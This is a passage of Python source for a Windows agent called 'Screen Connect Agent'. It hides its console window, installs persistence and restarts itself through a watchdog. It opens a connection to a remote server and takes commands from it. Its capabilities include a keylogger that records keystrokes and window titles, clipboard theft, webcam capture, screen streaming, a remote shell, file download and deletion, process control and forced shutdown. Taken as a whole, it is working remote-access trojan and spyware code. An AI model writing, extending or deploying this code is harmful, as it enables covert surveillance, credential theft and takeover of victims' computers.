            return {"error": str(e)}

    @staticmethod
    def delete_file(path: str) -> dict:
        try:
            p = Path(path)
            if p.is_file():
                p.unlink()
                return {"success": True, "message": f"Deleted: {path}"}
            elif p.is_dir():
                import shutil; shutil.rmtree(str(p))
                return {"success": True, "message": f"Deleted dir: {path}"}
            return {"success": False, "message": "Path not found."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def list_drives() -> list:
        drives = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                drives.append({
                    "drive":    p.mountpoint,
                    "total_gb": round(u.total / (1024**3), 2),
                    "free_gb":  round(u.free  / (1024**3), 2),
                    "percent":  u.percent,
                    "fstype":   p.fstype,
                })
            except Exception:
                pass
        return drives


# ════════════════════════════════════════════════════════════════════════════
#  REMOTE SHELL
# ════════════════════════════════════════════════════════════════════════════
class RemoteShell:
    TIMEOUT = 30

    @staticmethod
    def execute(command: str, shell_type: str = "cmd") -> dict:
        t0 = time.time()
        try:
            cmd = ["powershell", "-NoProfile", "-NonInteractive", "-Command", command] \
                  if shell_type == "powershell" else command
            result = subprocess.run(
                cmd, shell=(shell_type == "cmd"),
                capture_output=True, text=True, timeout=RemoteShell.TIMEOUT
            )
            return {
                "success":    True,
                "command":    command,
                "stdout":     result.stdout[-8192:],
                "stderr":     result.stderr[-4096:],
                "returncode": result.returncode,
                "elapsed_s":  round(time.time() - t0, 3),
                "ts":         datetime.utcnow().isoformat(),
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "command": command, "error": "Timed out (30s)."}
        except Exception as e:
            return {"success": False, "command": command, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  KEYLOGGER
# ════════════════════════════════════════════════════════════════════════════
class KeyLogger:
    def __init__(self, sio_client):
        self.sio       = sio_client
        self._buf: list = []
        self._lock     = threading.Lock()
        self._listener = None
        self._flush_t: threading.Thread | None = None
        self.running   = False

    def start(self):
        if not PYNPUT_OK or self.running:
            return
        self.running = True
        self._listener = pynput.keyboard.Listener(on_press=self._on_key)
        self._listener.start()
        self._flush_t = threading.Thread(target=self._flush_loop, daemon=True)
        self._flush_t.start()
        log.info("Keylogger started.")

    def stop(self):
        self.running = False
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass

    def _on_key(self, key):
        try:
            with self._lock:
                ch = key.char if hasattr(key, "char") and key.char else f"[{str(key).replace('Key.', '')}]"
                self._buf.append(ch)
        except Exception:
            pass

    def _active_window(self) -> str:
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except Exception:
            return ""

    def _flush_loop(self):
        while self.running:
            time.sleep(CONFIG["KEYLOG_FLUSH_INTERVAL"])
            self._flush()

    def _flush(self):
        with self._lock:
            if not self._buf:
                return
            text = "".join(self._buf)
            self._buf.clear()
        try:
            self.sio.emit("keylog_data", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "text":      text,
                "window":    self._active_window(),
                "ts":        datetime.utcnow().isoformat(),
            })
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════════════
#  CLIPBOARD MONITOR
# ════════════════════════════════════════════════════════════════════════════
class ClipboardMonitor:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self._last   = ""
        self._t: threading.Thread | None = None
        self.running = False

    def start(self):
        if not CLIPBOARD_OK or self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        poll = CONFIG["CLIPBOARD_POLL_MS"] / 1000.0
        while self.running:
            try:
                cur = pyperclip.paste()
                if cur and cur != self._last:
                    self._last = cur
                    self.sio.emit("clipboard_data", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content":   cur[:4096],
                        "length":    len(cur),
                        "ts":        datetime.utcnow().isoformat(),
                    })
            except Exception:
                pass
            time.sleep(poll)


# ════════════════════════════════════════════════════════════════════════════
#  WEBCAM CAPTURE
# ════════════════════════════════════════════════════════════════════════════
class WebcamCapture:
    def __init__(self, sio_client):
        self.sio = sio_client

    def capture(self, camera_idx: int = 0) -> dict:
        if not CV2_OK:
            return {"error": "OpenCV not available."}
        try:
            cap = cv2.VideoCapture(camera_idx)
            if not cap.isOpened():
                return {"error": f"Camera {camera_idx} could not be opened."}
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return {"error": "Failed to read frame from camera."}
            success, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 75])
            if not success:
                return {"error": "Encoding failed."}
            return {
                "success":    True,
                "camera_idx": camera_idx,
                "frame":      base64.b64encode(buf.tobytes()).decode(),
                "w":          frame.shape[1],
                "h":          frame.shape[0],
                "ts":         datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def list_cameras() -> list:
        if not CV2_OK:
            return []
        cameras = []
        for i in range(5):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cameras.append({"index": i, "name": f"Camera {i}"})
                cap.release()
        return cameras


# ════════════════════════════════════════════════════════════════════════════
#  HEARTBEAT
# ════════════════════════════════════════════════════════════════════════════
class Heartbeat:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self._t: threading.Thread | None = None
        self.running = False

    def start(self):
        if self.running:
            return
        self.running = True
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()

    def stop(self):
        self.running = False

    def _loop(self):
        while self.running:
            try:
                self.sio.emit("heartbeat", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "cpu":       psutil.cpu_percent(interval=0),
                    "ram":       psutil.virtual_memory().percent,
                    "ts":        datetime.utcnow().isoformat(),
                })
            except Exception as e:
                log.warning(f"Heartbeat error: {e}")
            time.sleep(CONFIG["HEARTBEAT_INTERVAL"])


# ════════════════════════════════════════════════════════════════════════════
#  MAIN AGENT CLASS
#
#  v5.0 RECONNECTION FIX:
#  ───────────────────────
#  Old approach: reuse same socketio.Client forever.
#  Problem: after disconnect, the Client accumulates internal state
#  (namespace handlers, transport objects) that causes silent failures
#  on reconnect. It "connects" but never fires the connect event.
#
#  Fix: Create a brand-new socketio.Client on every reconnect attempt.
#  Recreate all sub-components (streamer, heartbeat, etc.) that hold
#  a reference to the client. This is the only reliable approach.
#
#  The run() loop creates a fresh agent + client each time around.
# ════════════════════════════════════════════════════════════════════════════
class ScreenConnectAgent:
    def __init__(self):
        self._reconnect_delay = CONFIG["RECONNECT_BASE"]
        self._stop_flag       = threading.Event()

    def _make_client(self):
        """Create a fresh socketio.Client with all sub-components."""
        sio = socketio.Client(
            logger=False,
            engineio_logger=False,
            reconnection=False,   # we handle reconnection manually
        )
        cursor      = CursorTracker(sio)
        streamer    = ScreenStreamer(sio, cursor)
        sys_monitor = SystemMonitor(sio)
        keylogger   = KeyLogger(sio)
        clipboard   = ClipboardMonitor(sio)
        webcam      = WebcamCapture(sio)
        shell       = RemoteShell()
        proc_mgr    = ProcessManager()
        files       = FileBrowser()
        heartbeat   = Heartbeat(sio)

        self._register_events(sio, cursor, streamer, sys_monitor, keylogger,
                              clipboard, webcam, shell, proc_mgr, files, heartbeat)
        return sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard

    def _register_events(self, sio, cursor, streamer, sys_monitor, keylogger,
                         clipboard, webcam, shell, proc_mgr, files, heartbeat):

        @sio.event
        def connect():
            self._reconnect_delay = CONFIG["RECONNECT_BASE"]
            log.info(f"Connected to {CONFIG['SERVER_URL']}")

            fp = get_device_fingerprint()
            fp["device_id"] = CONFIG["DEVICE_TOKEN"]
            fp["token"]     = CONFIG["DEVICE_TOKEN"]
            sio.emit("agent_connect", fp)

            # Belt-and-suspenders: also do HTTP checkin
            try:
                requests.post(
                    CONFIG["SERVER_URL"].rstrip("/") + "/agent/checkin",
                    json={"device_id": CONFIG["DEVICE_TOKEN"], **fp},
                    timeout=10
                )
            except Exception:
                pass

            heartbeat.start()
            cursor.start()
            if CONFIG["ENABLE_KEYLOGGER"]:  keylogger.start()
            if CONFIG["ENABLE_CLIPBOARD"]:  clipboard.start()

        @sio.event
        def disconnect():
            log.warning("Disconnected from server.")
            streamer.stop()
            sys_monitor.stop()
            heartbeat.stop()

        # ── Frame ACK — THE KEY FIX ───────────────────────────────────────
        @sio.on("frame_ack")
        def on_frame_ack(data):
            """
            Server sends this after relaying each frame to dashboards.
            We open the gate so the streamer sends the next frame.
            Without this, streamer sends 1 frame and the gate stays closed.
            """
            streamer.on_ack()

        # ── Dashboard Commands ─────────────────────────────────────────────
        @sio.on("request_action")
        def on_action(data):
            tab = data.get("tab", "")
            log.info(f"Action: {tab}")

            # ── Monitor / Stream ───────────────────────────────────────────
            if tab == "monitor":
                action = data.get("action", "start")
                if action == "start":
                    streamer.start(
                        monitor=data.get("monitor",  CONFIG["STREAM_MONITOR"]),
                        fps=    data.get("fps",      CONFIG["STREAM_FPS"]),
                        quality=data.get("quality",  CONFIG["STREAM_QUALITY"]),
                        scale=  data.get("scale",    CONFIG["STREAM_SCALE"]),
                        mode=   data.get("mode",     CONFIG["STREAM_MODE"]),
                    )
                elif action == "stop":
                    streamer.stop()
                elif action == "set_mode":
                    streamer.set_mode(data.get("mode", "video"))
                    sio.emit("action_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "action": "set_mode",
                        "mode": streamer.mode,
                        "success": True,
                    })
                elif action == "set_quality":
                    q = int(data.get("quality", 55))
                    streamer._quality_current = max(10, min(95, q))
                elif action == "set_fps":
                    streamer.fps = int(data.get("fps", 20))

            # ── Single screenshot ──────────────────────────────────────────
            elif tab == "screenshot":
                q = data.get("quality", CONFIG["STREAM_QUALITY"])
                s = data.get("scale",   CONFIG["STREAM_SCALE"])
                old_q, old_s = streamer.quality, streamer.scale
                streamer.quality, streamer.scale = q, s
                img = streamer.capture_single()
                streamer.quality, streamer.scale = old_q, old_s
                if img:
                    sio.emit("screenshot_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "frame": img, "image": img,
                        "ts": datetime.utcnow().isoformat(),
                    })

            # ── Mouse ──────────────────────────────────────────────────────
            elif tab == "mouse_event":
                if PYAUTOGUI_OK:
                    x   = int(data.get("x", 0))
                    y   = int(data.get("y", 0))
                    typ = data.get("type", "move")
                    btn = {0: "left", 1: "middle", 2: "right"}.get(int(data.get("button", 0)), "left")
                    try:
                        if   typ == "move":     pyautogui.moveTo(x, y, duration=0, _pause=False)
                        elif typ == "down":     pyautogui.mouseDown(x, y, button=btn, _pause=False)
                        elif typ == "up":       pyautogui.mouseUp(x, y, button=btn, _pause=False)
                        elif typ == "click":    pyautogui.click(x, y, button=btn, _pause=False)
                        elif typ == "rclick":   pyautogui.click(x, y, button="right", _pause=False)
                        elif typ == "dblclick": pyautogui.doubleClick(x, y, _pause=False)
                        elif typ == "drag":
                            tx, ty = int(data.get("tx", x)), int(data.get("ty", y))
                            pyautogui.dragTo(tx, ty, duration=0.1, button=btn, _pause=False)
                    except Exception as e:
                        log.warning(f"mouse_event: {e}")

            # ── Scroll ─────────────────────────────────────────────────────
            elif tab == "scroll_event":
                if PYAUTOGUI_OK:
                    try:
                        x, y = int(data.get("x", 0)), int(data.get("y", 0))
                        dy   = data.get("dy", 0)
                        clicks = int(-dy / 100) if dy else 0
                        if clicks:
                            pyautogui.scroll(clicks, x=x, y=y, _pause=False)
                    except Exception as e:
                        log.warning(f"scroll_event: {e}")

            # ── Keyboard ───────────────────────────────────────────────────
            elif tab == "key_event":
                if PYAUTOGUI_OK:
                    ktype = data.get("type", "down")
                    key   = data.get("key", "")
                    combo = data.get("combo", "")
                    KEY_MAP = {
                        "Enter":"enter","Backspace":"backspace","Tab":"tab",
                        "Escape":"esc","Delete":"delete","Insert":"insert",
                        "Home":"home","End":"end","PageUp":"pageup","PageDown":"pagedown",
                        "ArrowUp":"up","ArrowDown":"down","ArrowLeft":"left","ArrowRight":"right",
                        " ":"space","Control":"ctrl","Alt":"alt","Shift":"shift","Meta":"win",
                        "F1":"f1","F2":"f2","F3":"f3","F4":"f4","F5":"f5","F6":"f6",
                        "F7":"f7","F8":"f8","F9":"f9","F10":"f10","F11":"f11","F12":"f12",
                    }
                    try:
                        if combo == "ctrl+alt+del":
                            subprocess.Popen(["powershell","-Command",
                                "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
                                creationflags=subprocess.CREATE_NO_WINDOW)
                        elif ktype in ("down", "press"):
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                hotkey = []
                                if data.get("ctrl")  and key != "Control": hotkey.append("ctrl")
                                if data.get("alt")   and key != "Alt":     hotkey.append("alt")
                                if data.get("shift") and key != "Shift":   hotkey.append("shift")
                                hotkey.append(pg)
                                if len(hotkey) > 1:
                                    pyautogui.hotkey(*hotkey, _pause=False)
                                else:
                                    pyautogui.keyDown(pg, _pause=False)
                        elif ktype == "up":
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                pyautogui.keyUp(pg, _pause=False)
                    except Exception as e:
                        log.warning(f"key_event: {e}")

            # ── Ping ───────────────────────────────────────────────────────
            elif tab == "ping":
                sio.emit("ping_result", {"device_id": CONFIG["DEVICE_TOKEN"], "t": data.get("t")})

            # ── System ────────────────────────────────────────────────────
            elif tab == "system":
                action = data.get("action", "start")
                if action == "start": sys_monitor.start(interval=data.get("interval", 2))
                else:                 sys_monitor.stop()

            elif tab == "system_snapshot":
                sio.emit("system_stats_report", sys_monitor.get_snapshot())

            elif tab == "disks":
                sio.emit("disks_report",   {"device_id": CONFIG["DEVICE_TOKEN"], "disks":      sys_monitor.get_disk_list()})

            elif tab == "network":
                sio.emit("network_report", {"device_id": CONFIG["DEVICE_TOKEN"], "interfaces": sys_monitor.get_network_interfaces()})

            # ── Processes ─────────────────────────────────────────────────
            elif tab == "processes":
                procs = proc_mgr.list_processes()
                sio.emit("processes_report", {"device_id": CONFIG["DEVICE_TOKEN"], "processes": procs, "count": len(procs)})

            elif tab == "kill_process":
                sio.emit("kill_result", {"device_id": CONFIG["DEVICE_TOKEN"], **proc_mgr.kill_process(int(data.get("pid", 0)))})

            elif tab == "start_process":
                sio.emit("start_process_result", {"device_id": CONFIG["DEVICE_TOKEN"], **proc_mgr.start_process(data.get("command", ""))})

            # ── Shell ─────────────────────────────────────────────────────
            elif tab == "shell":
                result = shell.execute(data.get("command", "echo hello"), shell_type=data.get("shell_type", "cmd"))
                sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            # ── Files ─────────────────────────────────────────────────────
            elif tab == "file_list":
                sio.emit("file_list_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **files.list_directory(data.get("path", "C:\\"))})

            elif tab == "file_read":
                sio.emit("file_read_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **files.read_file(data.get("path", ""))})

            elif tab == "file_download":
                sio.emit("file_download_result", {"device_id": CONFIG["DEVICE_TOKEN"], **files.download_file(data.get("path", ""))})

            elif tab == "file_delete":
                sio.emit("file_delete_result",   {"device_id": CONFIG["DEVICE_TOKEN"], **files.delete_file(data.get("path", ""))})

            elif tab == "drives":
                sio.emit("drives_report", {"device_id": CONFIG["DEVICE_TOKEN"], "drives": files.list_drives()})

            # ── Webcam ────────────────────────────────────────────────────
            elif tab == "webcam":
                sio.emit("webcam_result",      {"device_id": CONFIG["DEVICE_TOKEN"], **webcam.capture(data.get("camera", 0))})

            elif tab == "webcam_list":
                sio.emit("webcam_list_result", {"device_id": CONFIG["DEVICE_TOKEN"], "cameras": webcam.list_cameras()})

            # ── Clipboard ─────────────────────────────────────────────────
            elif tab == "clipboard_get":
                if CLIPBOARD_OK:
                    sio.emit("clipboard_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content": pyperclip.paste()[:4096],
                        "ts": datetime.utcnow().isoformat()
                    })

            elif tab == "clipboard_set":
                if CLIPBOARD_OK:
                    pyperclip.copy(data.get("text", ""))
                    sio.emit("clipboard_set_result", {"device_id": CONFIG["DEVICE_TOKEN"], "success": True})

            # ── Power ─────────────────────────────────────────────────────
            elif tab == "lock_screen":
                ctypes.windll.user32.LockWorkStation()
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "lock_screen", "success": True})

            elif tab == "sleep":
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "sleep", "success": True})
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

            elif tab == "shutdown":
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "shutdown", "success": True})
                time.sleep(1); os.system("shutdown /s /t 10 /c \"Screen Connect remote shutdown\"")

            elif tab == "restart":
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "restart", "success": True})
                time.sleep(1); os.system("shutdown /r /t 10 /c \"Screen Connect remote restart\"")

            elif tab == "abort_shutdown":
                os.system("shutdown /a")
                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "abort_shutdown", "success": True})

            elif tab == "uninstall":
                remove_persistence()
                sio.disconnect()
                sys.exit(0)

            else:
                log.warning(f"Unknown tab: {tab}")

    # ── Main Run Loop — creates fresh client on every reconnect ───────────
    def run(self):
        log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
        install_persistence()
        time.sleep(CONFIG["STARTUP_DELAY"])

        while not self._stop_flag.is_set():
            sio = streamer = sys_monitor = heartbeat = cursor = keylogger = clipboard = None
            try:
                # ── Create fresh client every attempt ─────────────────────
                sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard = self._make_client()

                log.info(f"Connecting to {CONFIG['SERVER_URL']}...")
                sio.connect(
                    CONFIG["SERVER_URL"],
                    transports=["websocket", "polling"],
                    wait_timeout=20,
                    socketio_path="/socket.io",
                )
                # sio.wait() blocks until disconnect
                sio.wait()

            except socketio.exceptions.ConnectionError as e:
                log.warning(f"Connection error: {e}")
            except Exception as e:
                log.error(f"Agent error: {e}")
            finally:
                # Clean shutdown of all sub-components
                try:
                    if streamer:    streamer.stop()
                    if sys_monitor: sys_monitor.stop()
                    if heartbeat:   heartbeat.stop()
                    if cursor:      cursor.stop()
                    if keylogger:   keylogger.stop()
                    if clipboard:   clipboard.stop()
                except Exception:
                    pass

            if self._stop_flag.is_set():
                break

            # Exponential backoff + jitter
            jitter = random.uniform(0, self._reconnect_delay * 0.3)
            delay  = self._reconnect_delay + jitter
            log.info(f"Reconnecting in {delay:.1f}s...")
            time.sleep(delay)
            self._reconnect_delay = min(self._reconnect_delay * 2, CONFIG["RECONNECT_MAX"])

    def stop(self):
        self._stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
#  WATCHDOG — restarts agent thread if it dies unexpectedly
# ════════════════════════════════════════════════════════════════════════════
def _watchdog(agent: ScreenConnectAgent, agent_thread_ref: list):
    time.sleep(45)
    while True:
        time.sleep(60)
        t = agent_thread_ref[0]
        if t and not t.is_alive():
            log.warning("Watchdog: agent thread died — restarting...")
            try:
                new_agent  = ScreenConnectAgent()
                new_thread = threading.Thread(target=new_agent.run, daemon=False, name="sc-main")
                new_thread.start()
                agent_thread_ref[0] = new_thread
            except Exception as e:
                log.error(f"Watchdog restart failed: {e}")


# ════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    # Hide console window
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

    agent = ScreenConnectAgent()

    agent_thread = threading.Thread(target=agent.run, daemon=False, name="sc-main")
    agent_ref    = [agent_thread]
    agent_thread.start()

    watchdog_thread = threading.Thread(target=_watchdog, args=(agent, agent_ref), daemon=True, name="sc-watchdog")
    watchdog_thread.start()

    agent_thread.join()
